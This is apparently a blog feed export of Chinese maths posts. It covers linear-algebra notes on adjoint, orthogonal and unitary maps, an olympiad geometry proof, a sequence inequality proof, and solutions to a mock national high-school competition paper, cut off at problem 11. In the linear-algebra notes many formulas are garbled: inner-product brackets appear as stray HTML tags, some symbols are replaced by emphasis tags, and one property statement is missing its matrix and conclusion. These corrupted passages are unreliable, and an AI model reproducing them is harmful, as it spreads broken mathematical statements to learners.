$\Longleftrightarrow$ $f=f^*$;</li><li>$2)$ $f$ 为对称变换 $\Longleftrightarrow$ $f$ 在任意标准正交基下的矩阵都是对称矩阵.</li></ul></li><li><strong><em>Proof:</em></strong><ul><li>$1)$ $\Longleftarrow:$ $\left<x,f(y)\right>=\left<x,f^*(y)\right>=\left<f(x),y\right>$;<br>$\quad\Longrightarrow: f^<em>(y)=\sum\limits_{i=1}^n\left&lt;v_i, f^</em>(y)\right&gt;v_i =\sum\limits_{i=1}^n\left<f(y), v_i\right="">v_i =\sum\limits_{i=1}^n\left<f(y), v_i\right="">v_i=f(y)$, $\forall y\in\mathcal{U}$, 故 $f=f^*$.</f(y),></f(y),></f(x),y\right></x,f^*(y)\right></x,f(y)\right></li><li>$2)$ $\Longleftarrow:$ 设 $f$ 在标准正交基下的矩阵为 $A$, 则 $f$ 对称 $\Longrightarrow$ $f=f^*$ $\Longrightarrow$ $A=A^T$ $\Longrightarrow$ $A$ 对称.<br>$\quad\Longrightarrow:$ 在 $Chapter 1$ 中已经证明.</li></ul></li></ul><h3 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{R}^{n\times n}\quad \left<a, b\right=""> = trace(B^TA)$ 是 $\mathbb{R}^{n\times n}$ 上的标准内积.<script type="math/tex; mode=display">f:\mathbb{R}^{n\times n}\rightarrow\mathbb{R}^{n\times n}\quad A\rightarrow A^T.</script></a,></li><li>考虑 $\left<f(a), b\right="">=trace(B^TA^T)=trace(AB)=trace(BA)$,<br>则 $\left<a, f^*(b)\right="">=trace(f^<em>(B)^TA)$, 那么 $f^</em>=f$.</a,></f(a),></li></ul><h3 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h3><ul><li>$\mathcal{C}_T^\infty(\mathbb{R})=\left\{f\in\mathcal{C}^\infty(\mathbb{R})\mid f(x)=f(x+T),\forall x\in\mathbb{R}\right\}$</li><li>$\left<f, g\right=""> = \int_a^b{f\left(x\right) g\left( x \right) dx}$ 是 $\mathcal{C}\left[a, b\right]$ 上的标准内积.<script type="math/tex; mode=display">D:\mathcal{C}_T^\infty(\mathbb{R})\rightarrow\mathcal{C}_T^\infty(\mathbb{R})\quad f\rightarrow f'.</script></f,></li><li>由 $\left<d(f), g\right="">=\int_0^Tf’(x)g(x)dx=\int_0^Tg(x)df(x)=fg|_0^T-\int_0^Tf(x)g’(x)dx=-\int_0^Tf(x)g’(x)dx=\left<f, -d(g)\right="">$, 那么 $d^*=-D$.</f,></d(f),></li></ul><h3 id="Definition-3-2"><a href="#Definition-3-2" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>给定欧氏空间 $\left(\mathcal{U}, \left&lt; \cdot, \cdot\right&gt;\right)$, $f\in\mathcal{Hom}\mathcal{(U, U)}$, 若 $\forall x,y\in\mathcal{U}$, 有<script type="math/tex">\left<f(x),f(y)\right>=\left<x,y\right>,</script><br>则称 $f$ 为 $\mathcal{U}$ 上的一个正交变换.</li></ul><h3 id="Property-4-1"><a href="#Property-4-1" class="headerlink" title="Property 4"></a>Property 4</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$, 以下命题等价:<ul><li>$1)$ $f$ 为正交变换;</li><li>$2)$ $f$ 为保距变换;</li><li>$3)$ $f$ 把 $\mathcal{U}$ 的一组标准正交基映为另一组标准正交基.</li></ul></li></ul><h3 id="Property-5-1"><a href="#Property-5-1" class="headerlink" title="Property 5"></a>Property 5</h3><ul><li>$f\in\mathcal{Hom}\mathcal{(U, U)}$.<ul><li>$1)$ $f$ 为正交变换 $\Longleftrightarrow$ $f\circ f^<em>=f^</em>\circ f=id_{\mathcal{U}}$;</li><li>$2)$ $f$ 为保距变换 $\Longleftrightarrow$ $f$ 在任意标准正交基下的矩阵都是正交矩阵.</li></ul></li></ul><h3 id="Property-6-1"><a href="#Property-6-1" class="headerlink" title="Property 6"></a>Property 6</h3><ul><li>$Q$ 为实正交矩阵, $\lambda\in\mathbb{C}$ 是 $Q$ 的特征值 $\Longrightarrow$ $|\lambda|=1$.</li></ul><h3 id="Property-7"><a href="#Property-7" class="headerlink" title="Property 7"></a>Property 7</h3><ul><li>$Q$ 为 $n$ 阶正交矩阵, 存在 $n$ 阶正交矩阵 $X$, $\lambda\in\mathbb{C}$ 是 $Q$ 的特征值 $\Longrightarrow$ $|\lambda|=1$.</li><li>其中 $\theta_{i}$ 不是平角的倍数, $J$ 称为 $Q$ 的实相似标准型.</li></ul><h3 id="Tip-1-1"><a href="#Tip-1-1" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>给定 $n$ 维欧氏空间 $\mathcal{V}$ 及其上的正交变换 $f:\mathcal{V}\rightarrow\mathcal{V}$, 都存在着 $\mathcal{V}$ 的一组标准正交基, 使得 $f$ 在该组基下的矩阵形如<strong>Property 7</strong>中的 $J$.</li></ul><h3 id="Tip-2-1"><a href="#Tip-2-1" class="headerlink" title="Tip 2"></a>Tip 2</h3><ul><li>任意 $n$ 阶正交矩阵 $Q$ 都可以分解为不超过 $n$ 个反射矩阵的乘积.</li></ul><h2 id="Chapter-4-酉空间"><a href="#Chapter-4-酉空间" class="headerlink" title="Chapter 4 酉空间"></a>Chapter 4 酉空间</h2><h3 id="Question-1-3"><a href="#Question-1-3" class="headerlink" title="Question 1"></a>Question 1</h3><ul><li>能否在复向量空间 $\mathcal{V}$ 上定义内积?</li><li>注意到如果不对内积的定义进行修改, 考虑内积 $\left<ia, ia\right="">$, 那么正定性与双线性性是彼此矛盾的.</ia,></li></ul><h3 id="Definition-1-3"><a href="#Definition-1-3" class="headerlink" title="Definition 1"></a>Definition 1</h3><ul><li>给定线性空间$\mathcal{V}/\mathbb{C}$, $\left&lt;\cdot, \cdot\right&gt;:\mathcal{V}\times\mathcal{V}\rightarrow\mathbb{C}$, 满足$\forall a,b\in\mathcal{V}$, 有<ul><li>$a)$ 共轭对称性: $\left<a, b\right=""> = \overline{\left<b, a\right="">}$;</b,></a,></li><li>$b)$ 线性性和共轭线性性: $\left<k_1a_1+k_2a_2, b\right=""> = k_1\left<a_1, b\right=""> + k_2\left<a_2, b\right="">$;<br>$\quad\qquad\qquad\qquad\qquad\left<a, k_1b_1+k_2b_2\right=""> = \overline{k_1}\left<a, b_1\right=""> + \overline{k_2}\left<a, b_2\right="">$;</a,></a,></a,></a_2,></a_1,></k_1a_1+k_2a_2,></li><li>$c)$ 正定性: $\left<a, a\right=""> \ge 0$, 取等当且仅当 $a = 0$.</a,></li></ul></li><li>则称二元函数是 $\mathcal{V}$ 上的一个内积, $\mathcal{V}$ 是一个酉空间.</li></ul><h3 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h3><ul><li>$\mathbb{C}^n\quad \left<a, b\right=""> = \overline{b}^Ta$ 是 $\mathbb{C}^n$上的标准内积.<br>$D$ 是对角元素均为正的对角阵, $\left<a, b\right=""> = \overline{b}^TDa$.</a,></a,></li></ul><h3 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2"></a>Example 2</h3><ul><li>$\mathbb{C}^{m\times n}\quad \left<a, b\right=""> = trace(\overline{B}^TA)$ 是 $\mathbb{C}^{m\times n}$ 上的标准内积.</a,></li></ul><h3 id="Property-1-3"><a href="#Property-1-3" class="headerlink" title="Property 1"></a>Property 1</h3><ul><li><p>$(Cauchy-Schwarz\ Inequality)$</p><p>$\left| \left<a, b\right=""> \right|$ ≤ $\left| a \right|\cdot \left| b \right| $.</a,></p></li><li><p>等号成立当且仅当 $a, b$ 共线, 其中 $a, b\in$ 酉空间 $\mathcal{V}$.</p></li></ul><h3 id="Definition-2-3"><a href="#Definition-2-3" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定酉空间 $\left(\mathcal{V}, \left&lt; \cdot, \cdot\right&gt;_{\mathcal{V}}\right)$, $f, g\in\mathcal{Hom}\mathcal{(V, V)}$, 使得 $\forall x, y\in\mathcal{V}$, 有<script type="math/tex">\left<f(x),y\right>=\left<x,g(y)\right>,</script></li><li>则称 $g$ 为 $f$ 的共轭映射或伴随映射, $g=f^*$.</li></ul><h3 id="Question-2-2"><a href="#Question-2-2" class="headerlink" title="Question 2"></a>Question 2</h3><ul><li>如何从矩阵的角度理解伴随映射?<ul><li>$1)$ 基本情形: 考虑 $\mathcal{U}=\mathbb{C}^n, \mathcal{V}=\mathbb{C}^m$ 及其上的标准内积,<script type="math/tex; mode=display">f\in\mathcal{Hom}\mathcal{(U, V)}\xrightarrow{\quad\quad\quad\quad}A\in\mathbb{C}^{m\times n}, x\rightarrow Ax, x\in\mathbb{R}^n;</script><script type="math/tex; mode=display">f^*\in\mathcal{Hom}\mathcal{(V, U)}\xrightarrow{\quad\quad\quad\quad}B\in\mathbb{C}^{n\times m}, y\rightarrow By, y\in\mathbb{R}^n.</script>$\forall x\in\mathbb{R}^n, y\in\mathbb{R}^m$, 有 $\overline{y}^TAx=\left<ax,y\right>=\left<f(x),y\right>=\left<x,f^*(y)\right>=\left<x,by\right>=\overline{y}^T\overline{B}^Tx$,<br>进而 $A=\overline{B}^T, B=\overline{A}^T:=A^H$ 成立.</x,by\right></x,f^*(y)\right></f(x),y\right></ax,y\right></li><li>$2)$ 一般情形: 假定 $\mathcal{U},\mathcal{V}$ 的一组标准正交基分别为<script type="math/tex; mode=display">u_1, u_2, \dots, u_n, v_1, v_2, \dots, v_m.</script>设 $f:\mathcal{U}\rightarrow\mathcal{V}$ 在两组基下表示矩阵为 $F$, 则 $f^*:\mathcal{V}\rightarrow\mathcal{U}$ 的表示矩阵为 $F^H$.</li></ul></li></ul><h3 id="Definition-2-4"><a href="#Definition-2-4" class="headerlink" title="Definition 2"></a>Definition 2</h3><ul><li>给定酉空间 $\mathcal{V}$, 其上的变换 $f\in\mathcal{Hom}\mathcal{(V, V)}$ 以及相应的矩阵 $A$. 使得 $\forall x, y\in\mathcal{V}$, 有<ul><li>$a)$ (自伴变换) $\left<f(x),y\right>=\left<x,f(y)\right> \leftrightarrow f=f^* \leftrightarrow A=A^H$;</x,f(y)\right></f(x),y\right></li><li>$b)$ (酉变换) $\left<f(x),f(y)\right>=\left<x,y\right> \leftrightarrow ff^<em>=f^</em>f=id_{\mathcal{V}} \leftrightarrow AA^H=A^HA=I$;</x,y\right></f(x),f(y)\right></li><li>$c)$ (正规变换) $ff^<em>=f^</em>f \leftrightarrow AA^H=A^HA$.</li></ul></li></ul><h3 id="Property-2-2"><a href="#Property-2-2" class="headerlink" title="Property 2"></a>Property 2</h3><ul><li>$\mathcal{V}$ 为酉空间, $\left(e_1, \dots, e_n\right)$ 为标准正交基, $U$ 为 $n$ 阶方阵, $(u_1, \dots, u_n) = (e_1, \dots, e_n) U$, 则<br>$(u_1, \dots, u_n)$为一组标准正交基 $\Longleftrightarrow U$ 是酉矩阵 $\Longleftrightarrow U$ 的列向量是 $\mathbb{C}^n$ 的标准正交基.</li></ul><h3 id="Property-3-2"><a href="#Property-3-2" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>酉空间 $\mathcal{V}:(u_1, \dots, u_n)=(e_1, \dots, e_n)U$, 其中 $(u_1, \dots, u_n), (e_1, \dots, e_n)$ 是 $\mathcal{V}$ 的标准正交基.</li><li>线性映射 $f:\mathcal{V}\rightarrow\mathcal{V}$, 记 $\sigma_{e_1,\dots, e_n}(f) = F$, 则 $\sigma_{u_1,\dots, u_n}(f) = U^{-1}FU = U^HFU$.</li></ul><h3 id="Tip-1-2"><a href="#Tip-1-2" class="headerlink" title="Tip 1"></a>Tip 1</h3><ul><li>$A, B$ 为复矩阵, 若存在酉矩阵 $U$, 使得 $U^HAU=B$, 则称 $A, B$ 酉相似.</li></ul><h3 id="Definition-3-3"><a href="#Definition-3-3" class="headerlink" title="Definition 3"></a>Definition 3</h3><ul><li>对任意 $n$ 阶方阵 $A$, 存在酉矩阵 $U$, 使得 $U^HAU=T$, $T$ 为上三角矩阵, 且对角元为 $A$ 的特征值.</li><li>通过选取 $U$, 可以将 $T$ 的对角元实现任意顺序排列.</li></ul><h3 id="Property-3-3"><a href="#Property-3-3" class="headerlink" title="Property 3"></a>Property 3</h3><ul><li>$Hermite$ 矩阵的特征值都是实数.</li><li>酉矩阵的特征值都是模长为1的复数.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代数一隅</title>
      <link href="/2022/09/12/dai-shu-yi-yu-09-12/"/>
      <url>/2022/09/12/dai-shu-yi-yu-09-12/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>正项数列 $\{a_n\}$ 满足 $a_{n+1}=\frac{n}{a_n}+1$. 求证: $\exists\thinspace k\in N$, 对 $\forall\thinspace n&gt;k$, 有 $a_{n+2}&gt;a_n$.</p><p><strong>Proof:</strong></p><script type="math/tex; mode=display">a_2=\frac{1}{a_1}+1>1,</script><script type="math/tex; mode=display">a_3=\frac{2}{a_2}+1\in(1, 3),</script><script type="math/tex; mode=display">a_4=\frac{3}{a_3}+1\in(2, 4),</script><script type="math/tex; mode=display">a_5=\frac{4}{a_4}+1\in(2, 3),</script><script type="math/tex; mode=display">a_6=\frac{5}{a_5}+1\in(\frac{8}{3}, \frac{7}{2}).</script><p>下证: 当 $n\ge 6$ 时, $\sqrt{n}&lt;a_n&lt;\sqrt{n+1}+1.$</p><p>$(1)$ 当 $n=6$ 时, 显然有 $\sqrt{6}&lt;\frac{8}{3}&lt;a_6&lt;\frac{7}{2}&lt;\sqrt{7}+1$ 成立.</p><p>$(2)$ 假设命题对 $n$ 成立,</p><p>那么 $a_{n+1}&lt;\frac{n}{\sqrt{n}}+1=\sqrt{n}+1&lt;\sqrt{n+2}+1$,</p><p>且 $a_{n+1}&gt;\frac{n}{\sqrt{n+1}+1}+1=\sqrt{n+1}$.</p><p>由$(1), (2)$可知,</p><script type="math/tex; mode=display">\mbox{当}\thinspace n\ge 6\thinspace\mbox{时}, \sqrt{n}<a_n<\sqrt{n+1}+1.</script><p>从而 $(a_n-1)^2&lt;n+1,$ 即 $a_n^2-2a_n-n&lt;0, \forall\thinspace n\ge 6.$</p><p>当 $n \ge 6$ 时, 有</p><script type="math/tex; mode=display">a_{n+2}=\frac{n+1}{\frac{n}{a_n}+1}+1>a_n\mbox{成立}.</script>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几何一窥</title>
      <link href="/2022/09/09/ji-he-yi-kui-09-09/"/>
      <url>/2022/09/09/ji-he-yi-kui-09-09/</url>
      
        <content type="html"><![CDATA[<p><strong>Problem:</strong></p><p>设$O, H$分别为$\triangle ABC$的外心和垂心, 过$AH$的中点$M$且垂直于$BM$的直线与$AC$交于$P$. 求证: $OP\parallel BC$.</p><p><strong>Proof:</strong></p><p>作$\odot O$直径$AD$, 取边$BC$中点$E$;</p><p>连接$BH$并延长交边$AC$于点$F$, 那么$BF\perp AC$;</p><p>延长$AH$交$\odot O$于点$H’$, 那么$AH’\perp BC$;</p><p>连接$BH’, CD$交于点$G$.</p><p>由垂心定理, 知$AH=2OE$, 连接$DH$交直线$OE$于点$E’$, </p><p>由$OE’\parallel AH,\thinspace AO=OD$, 知$OE’$为$\triangle ADH$的中位线, </p><p>故$OE’=\frac{1}{2}AH=OE$, 从而点$E, E’$重合, 即$D, E, H$三点共线. </p><p>连接$BD, DH’, H’C$,</p><p>由$\angle BAD=\angle BAO=90^{\circ}-\frac{1}{2}\angle AOB=90^{\circ}-\angle ACB=\angle HAC=\angle H’AC$,</p><p>知$BD=CH’$, 四边形$BDHC’$为等腰梯形, 由对称性知$O, E, G$三点共线.</p><p>由$\angle BH’H=\angle AH’B=\angle ACB=\angle BHH’$, 故$BH=BH’$.</p><p>又$BC\perp HH’$, 故$H, H’$关于直线$BC$对称.</p><p>要证明$OP\parallel BC \Longleftrightarrow \angle APO=\angle ACB$. </p><p>$(a)$ 先证明$\angle ACB=\angle OGC$.<br>\begin{equation<em>}<br>\begin{aligned}<br>\angle OGC &amp;= \angle GOD+\angle GDO\\<br>&amp;=\angle H’AD+\angle CDA\\<br>&amp;=(\angle BAC-\angle BAO-\angle CAH)+\angle CBA \\<br>&amp;=\angle BAC-(90^\circ-\frac{1}{2}\angle AOB)-(90^\circ-\angle ACB)+\angle CBA \\<br>&amp;=2\angle ACB+\angle ABC+\angle BAC-180^\circ\\<br>&amp;=\angle ACB.<br>\end{aligned}<br>\end{equation</em>}</p><p>$(b)$ 再证明$\angle APO=\angle OGC\Longleftrightarrow O, P, G, C$四点共圆.</p><p>连接边$OH’$, 注意到<br>\begin{equation<em>}<br>\begin{aligned}<br>\angle OH’C &amp;= \angle OH’A+\angle AH’C\\<br>&amp;=\angle OAH’+\angle ADC\\<br>&amp;=\angle DOG+\angle ODG\\<br>&amp;=\angle OGC,<br>\end{aligned}<br>\end{equation</em>}</p><p>故<br>\begin{equation}<br>O, H’, G, C\thinspace\mbox{四点共圆}. \tag{1}<br>\end{equation}</p><p>又注意到$\angle BMP=\angle BFP=90^\circ$, 故$B, M, P, F$四点共圆.</p><p>连接边$FM$, 直角$\triangle AHF$中, $M$为边$AH$中点, 故</p><script type="math/tex; mode=display">\angle BFM=\angle HFM=\angle FHM=\angle BHH'=\angle BH'M,</script><p>即$B, M, H’, F$四点共圆, 从而$B, M, H’, F, P$五点共圆.</p><p>那么连接$H’P$, 由$B, F, P, H’$四点共圆, 知$\angle H’PC=\angle H’BH$.</p><p>又因为<br>\begin{equation<em>}<br>\begin{aligned}<br>\angle H’OC &amp;= 2\angle H’AC\\<br>&amp;=2\angle H’BC\\<br>&amp;=\angle HBC+\angle H’BC\\<br>&amp;=\angle HBH’.<br>\end{aligned}<br>\end{equation</em>}</p><p>故$\angle H’OC=\angle H’BH=\angle H’PC$, 即<br>\begin{equation}<br>O, H’, P, C\thinspace\mbox{四点共圆}. \tag{2}<br>\end{equation}</p><p>由$(1), (2)$知, $O, H’, P, G, C$五点共圆.</p><p>因而$\angle APO=\angle OGC$得证.</p><p>综上, 由$(a), (b)$知$\angle ACB=\angle OGC=\angle APO$成立, 进而有$OP\parallel BC$. </p><p><img src="/pic/02.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Geometry </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高联一试模拟试题解答</title>
      <link href="/2022/09/05/gao-lian-yi-shi-mo-ni-shi-ti-jie-da/"/>
      <url>/2022/09/05/gao-lian-yi-shi-mo-ni-shi-ti-jie-da/</url>
      
        <content type="html"><![CDATA[<h1 id="全国高中数学联合竞赛一试模拟试题"><a href="#全国高中数学联合竞赛一试模拟试题" class="headerlink" title="全国高中数学联合竞赛一试模拟试题"></a>全国高中数学联合竞赛一试模拟试题</h1><h4 id="一、填空题"><a href="#一、填空题" class="headerlink" title="一、填空题"></a><strong>一、填空题</strong></h4><p><strong>1. </strong> 若点$P(x, y)$在直线$x+3y-3=0$上移动, 则函数$f(x, y)=3^x+9^y$的最小值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $5(\frac{27}{4})^{\frac{1}{5}}$.</p><p><strong>解析 </strong> 点$P(x, y)$在直线$x+3y-3=0$上, 则有$y=\frac{3-x}{3}$, 所以</p><p>\begin{equation*}</p><p>\begin{aligned}</p><p>f(x)&amp;=3^x+9^{\frac{3-x}{3}}=3^x+3^{2-\frac{2x}{3}} \\</p><p>&amp;=\frac{1}{2}\cdot 3^x + \frac{1}{2}\cdot 3^x + 3^{1-\frac{2x}{3}} + 3^{1-\frac{2x}{3}} + 3^{1-\frac{2x}{3}} \\</p><p>&amp;\ge 5\cdot\sqrt[5]{\frac{1}{2}\cdot 3^x\cdot\frac{1}{2}\cdot 3^x\cdot 3^{1-\frac{2x}{3}}\cdot 3^{1-\frac{2x}{3}}\cdot 3^{1-\frac{2x}{3}}} \\</p><p>&amp;=5(\frac{27}{4})^{\frac{1}{5}}.</p><p>\end{aligned}    </p><p>\end{equation*}</p><p><strong>2. </strong> 已知方程$x^2+(4+i)x+4+ai=0 ($其中$a\in\mathbb{R})$有实根$b$, 且$z=a+b i$, 那么复数$z=\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $2-2i$.</p><p><strong>解析 </strong> 将$x=b$代入方程, 有$(b+2)^2+(a+b)i=0$.  </p><p>分别令实部和虚部为零可得$a=2, b=-2$, 所以$z=2-2i$.</p><p><strong>3. </strong> 若实数$x, y$满足$\tan x=x, \tan y=y$, 且$|x|\ne |y|$, 则$\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $0$.</p><p><strong>解析 </strong> 由题意, 得</p><script type="math/tex; mode=display">\frac{\sin (x+y)}{x+y}=\frac{\sin (x+y)}{\tan x+\tan y}=\frac{\sin (x+y)}{\frac{\sin x}{\cos x}+\frac{\sin y}{\cos y}}=\cos x\cdot\cos y,</script><p>同理</p><script type="math/tex; mode=display">\frac{\sin(x-y)}{x-y} = \frac{\sin(x-y)}{\tan x-\tan y} = \frac{\sin(x-y)}{\frac{\sin x}{\cos x}-\frac{\sin y}{\cos y}}=\cos x \cdot\cos y,</script><p>故</p><script type="math/tex; mode=display">\frac{\sin (x+y)}{x+y}-\frac{\sin (x-y)}{x-y}=0.</script><p><strong>4. </strong> $\sum_{k=1}^{2022} \left[\sqrt[4]{\frac{2022}{k}}\right]$的值为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $2183$.</p><p><strong>解析 </strong> 所求的值为曲线$y=\sqrt[4]{\frac{2022}{x}}$与$x&gt;0, y&gt;0$所围区域内整点的数目.</p><p>将按列计数改为按行计数, 所求为</p><script type="math/tex; mode=display">\sum_{k=1}^{6}\left[\frac{2022}{k^4}\right]=2022+126+24+7+3+1=2183.</script><p><strong>5. </strong> 在数列${\left\{a_n\right\}}$中, $a_n=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})}$, 则数列$\left\{ a_n \right\}$前2022项的和为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $\frac{1}{2}(1+\sqrt{2022}-\sqrt{2023})$.</p><p><strong>解析 </strong> \begin{equation*}</p><p>\begin{aligned}</p><p>a_n&amp;=\frac{1}{(\sqrt{n-1}+\sqrt{n})(\sqrt{n}+\sqrt{n+1})(\sqrt{n-1}+\sqrt{n+1})} \\</p><p>&amp;=\frac{1}{\sqrt{n-1}+\sqrt{n+1}}-\frac{1}{\sqrt{n}+\sqrt{n+1}} \\</p><p>&amp;=\frac{\sqrt{n+1}-\sqrt{n-1}}{2}-\sqrt{n+1}+\sqrt{n} \\</p><p>&amp;=\frac{(\sqrt{n}-\sqrt{n+1})+(\sqrt{n}-\sqrt{n-1})}{2}.</p><p>\end{aligned}    </p><p>\end{equation*}</p><p>所以</p><p>\begin{equation*}</p><p>\begin{aligned}</p><p>S_{2022}&amp;=\frac{1}{2}(1-\sqrt{2}+\sqrt{2}-\sqrt{3}+\cdots +\sqrt{2022}-\sqrt{2023})+\frac{1}{2}(1-0+\sqrt{2}-1+\cdots +\sqrt{2022}-\sqrt{2021}) \\</p><p>&amp;=\frac{1}{2}(1-\sqrt{2023})+\frac{1}{2}\sqrt{2022} \\</p><p>&amp;=\frac{1}{2}(1+\sqrt{2022}-\sqrt{2023}).</p><p>\end{aligned}    </p><p>\end{equation*}</p><p><strong>6. </strong> 过四面体$ABCD$的顶点$D$作半径为1的球, 该球与四面体$ABCD$的外接球切于点$D$, 且与面$ABC$相切. 若$AD=2\sqrt{3}, \angle BAD=\angle CAD=45^\circ, \angle BAC=60^\circ$, 则四面体的外接球半径$r$为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $3$.</p><p><strong>解析 </strong> 过点$D$作平面$ABC$的垂线, 垂足为$H$; 作$DE\bot AB$, 垂足为$E$; 作$DF\bot AC$, 垂足为$F$.</p><p>那么$HE\bot AB$, $HF\bot AC$, 且$AE=AF=AD\cos45^\circ =\sqrt{6}.$</p><p>由$\triangle AEH\cong\triangle AFH$, 得$\angle HAE=30^\circ$, $AH=\frac{AE}{\cos 30^\circ}=2\sqrt{2}, DH=\sqrt{AD^2-AH^2}=2,$ </p><p>故$DH$为半径是$1$的球的直径,</p><p>那么四面体$ABCD$的外接球的球心$O$在$DH$的延长线上, 有</p><script type="math/tex; mode=display">r^2=(r-2)^2+(2\sqrt{2})^2, \Rightarrow r=3.</script><p><strong>7. </strong> 已知双曲线$\frac{x^2}{a^2}-\frac{y^2}{b^2}=1$的左顶点为$A$, 右焦点为$F$. 设$P$为第一象限中双曲线上的任意一点, 若总有$\angle PFA=2\angle FAP$, 则双曲线的离心率为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $2$.</p><p><strong>解析 </strong> 由题设, 可以取双曲线上的点$P$, 使$PF\bot x$轴, 得$P(c, y)$, 则$\frac{c^2}{a^2}-\frac{y^2}{b^2}=1$, </p><p>故$y^2=\frac{b^4}{a^2}$.因为$y&gt;0$, 所以$y=\frac{b^2}{a}=\frac{c^2-a^2}{a}$.</p><p>由$\angle PFA=2\angle FAP =\frac{\pi}{2},$得$\triangle AFP$是等腰三角形, 有$AF=PF$, </p><p>即$a+c=\frac{c^2-a^2}{a}$, 整理得</p><script type="math/tex; mode=display">c^2-ac-2a^2=0, \Rightarrow e^2-e-2=0.</script><p>又$e&gt;1,$解得$e=2$.</p><p><strong>8. </strong> 正整数集合$A_k$的最小元素为1, 最大元素为2022, 并且各元素可以从小到大排成一个公差为$k$的等差数列, 则并集$A_{43}\cup A_{47}$中的元素个数为$\underline{}\underline{}\underline{}\underline{}\underline{}\underline{}.$</p><p><strong>答案 </strong> $90$.</p><p><strong>解析 </strong> 用$|A_k|$表示集合$A_k$的元素个数.</p><p>设$|A_k|=n+1$, 由$2022=1+nk$, 得$n=\frac{2021}{k}$, 于是</p><script type="math/tex; mode=display">|A_{43}|=\frac{2021}{43}+1=48, |A_{47}|=\frac{2021}{47}+1=44, |A_{43}\cap A_{47}|=|A_{2021}|=\frac{2021}{2021}+1=2,</script><p>故</p><script type="math/tex; mode=display">|A_{43}\cup A_{47}|=|A_{43}|+|A_{47}|-|A_{43}\cap A_{47}|=48+44-2=90.</script><h4 id="二、解答题"><a href="#二、解答题" class="headerlink" title="二、解答题"></a><strong>二、解答题</strong></h4><p><strong>9. </strong> 已知实数$x, y$都在区间$(-2, 2)$内, 且$xy=-1$, 常数$a\in (2, 8)$, 求函数$f(x, y)=\frac{4}{4-x^2}+\frac{a^2}{a^2-y^2}$的最小值.</p><p><strong>解析 </strong> 设$m=\frac{x}{2}, n=-\frac{y}{a}, m,n\in (-1, 1), mn=\frac{1}{2a}, f(x, y)=\frac{1}{1-m^2}+\frac{1}{1-n^2}$.</p><p>由柯西不等式, 得</p><script type="math/tex; mode=display">(\frac{1}{1-m^2}+\frac{1}{1-n^2})[(1-m^2)+(1-n^2)]\ge (1+1)^2=4,</script><p>所以</p><script type="math/tex; mode=display">f(x,y)\ge\frac{4}{2-(m^2+n^2)}\ge\frac{4}{2-2mn}=\frac{4a}{2a-1},</script><p>当$m=n=\frac{1}{\sqrt{2a}},$即$x=\sqrt{\frac{2}{a}}, y=-\sqrt{\frac{a}{2}}\in (-2, 2)$(注意$a\in (2, 8))$时, 不等式中的等号可成立.</p><p>所以函数$f(x, y)$的最小值为$\frac{4a}{2a-1}$.</p><p><strong>10. </strong> 椭圆$C:\frac{x^2}{a^2}+\frac{y^2}{b^2}=1(a&gt;b&gt;0)$的左、右焦点分别为$F_1$、$F_2$, 右顶点为$A$, $P$为椭圆上任意一点, 已知$\overrightarrow{PF_1} \cdot \overrightarrow{PF_2}$的最大值为3, 最小值为2.</p><p>(1)求椭圆$C$的方程.</p><p><strong>解析 </strong> 椭圆的方程为$C:\frac{x^2}{4}+\frac{y^2}{3}=1$.</p><p>(2)若直线$l:y=kx+m$与椭圆$C$相交于$M, N$两点$(M, N$不是左、右顶点$)$, 且以$MN$为直径的圆过点A, 求证: 直线$l$过顶点, 并求出该定点的坐标.</p><p><strong>解析 </strong> 设点$M(x_1, y_1), N(x_2, y_2)$.</p><p>将$y=kx+m$代入椭圆的方程, 得</p><script type="math/tex; mode=display">(4k^2+3)x^2+8kmx+4m^2-12=0,</script><p>所以</p><script type="math/tex; mode=display">x_1+x_2=-\frac{8km}{4k^2+3}, x_1x_2=\frac{4m^2-12}{4k^2+3}.</script><p>进而$y_1y_2=k^2x_1x_2+km(x_1+x_2)+m^2$.</p><p>因为以$MN$为直径的圆过点$A$, 所以$\overrightarrow{AM}\cdot\overrightarrow{AN}=0$, 所以</p><script type="math/tex; mode=display">7m^2+16km+4k^2=0.</script><p>解得$m=-\frac{2}{7}k$, 或$m=-2k$, 均满足$\Delta &gt;0$.</p><p>若$m=-2k$, 直线$l$恒过定点$(2, 0)$, 不合题意, 舍去;</p><p>若$m=-\frac{2}{7}k$, 直线$l:y=k(x-\frac{2}{7})$恒过定点$(\frac{2}{7}, 0)$.</p><p><strong>11. </strong> 在等腰$\triangle ABC$中, 